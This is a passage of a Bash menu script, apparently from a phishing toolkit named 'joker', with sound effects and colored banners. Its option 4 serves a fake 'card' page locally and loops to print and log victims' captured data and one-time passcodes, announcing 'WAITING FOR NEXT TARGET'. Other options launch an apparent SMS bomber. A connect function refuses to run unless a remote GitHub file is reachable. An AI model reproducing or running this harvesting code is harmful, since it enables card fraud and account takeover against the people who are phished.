echo -e "\e[96m\t\t\t |======================================================|" | pv -qL 50
sleep 5.0
choose 
option
;;
3) 
mpv m/click.mp3 > /dev/null 2>1&
clear
game 
;;
4)
mpv m/click.mp3 > /dev/null 2>1&
cd .sites/
url="card"

cd card
local 
while true;

do
ip
if [ -e data.txt ];
then
mpv $HOME/joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m \n  $(cat data.txt)  "
cat data.txt >> $HOME/joker/www/data.txt
rm data.txt 
fi
if [ -e otp.txt ];
then

echo -e "\e[98m \n  \n \n$(cat otp.txt)  \n \n"
rm otp.txt

echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
6)
mpv m/click.mp3 > /dev/null 2>1&
update
;;
7) 
mpv m/click.mp3 > /dev/null 2>1&
exit 1
;;
8)
mpv m/click.mp3 > /dev/null 2>1&
speed
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
echo -e "\e[94m    DO YOU WANT TO SPEEDTEST AGAIN \n\t\t PRESS ENTER... \n\t\tOTHERWISE TYPE 'n' "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
read -p " CTRL + C FOR EXIT " spd
if [ $spd == "n" ];
then
choose 
option

else
speed
fi
;;
00)
mpv m/click.mp3 > /dev/null 2>1&
clear
new
;;
9)
mpv m/click.mp3 > /dev/null 2>1&
sbomb
;;

*)
mpv m/error.mp3 > /dev/null 2>1&
mpv $HOME/joker/m/error1.wav > /dev/null 2>1&
echo -e "\e[96m\t\t\t " | pv -qL 10   
echo -e "\e[96m\t\t\t            SELECT VAILID OPTION [×]                   " | pv -qL 50
echo -e "\e[96m\t\t\t " | pv -qL 20
sleep 2.0
choose
option
;;
esac
}



connect(){



while true ;
do
echo -e "\e[96m\t\t\t "
echo -e "\e[96m\t\t\t     CONNECTING....[!] " | pv -qL 10
echo -e "\e[96m\t\t\t\n\n"


wget -q --spider https://raw.githubusercontent.com/sukhdevr898/joker/main/update2.1


if [ $? -eq 0 ];
then
mpv $HOME/joker/m/start.mp3 > /dev/null 2>1&
echo -e "\e[96m\t\t\t\n\n"
echo -e "\e[96m\n\t\t\t |========= NOW  YOU ARE CONNECTED WITH SERVER ✓    ===|" | pv -qL 10
#banner
choose
option
else
mpv m/error.mp3 > /dev/null 2>1&
echo -e "\e[96m\t\t\t "
echo -e "\e[96m\t\t\t     NOT CONNECTED [×]                                 " | pv -qL 20
echo -e "\e[96m\t\t\t "
echo -e "\e[96m\t\t\t     CHECK INTERNET CONNECTION OTHERWISE               " | pv -qL 20
echo -e "\e[96m\t\t\t |  THIS TOOL REMOVED BY SUKHDEVR898 YOU CAN'T USE      " | pv -qL 20
echo -e "\e[96m\t\t\t |------------------------------------------------------|" | pv -qL 20
 sleep 2.0

fi
done



}







while true ;
do
connect
done

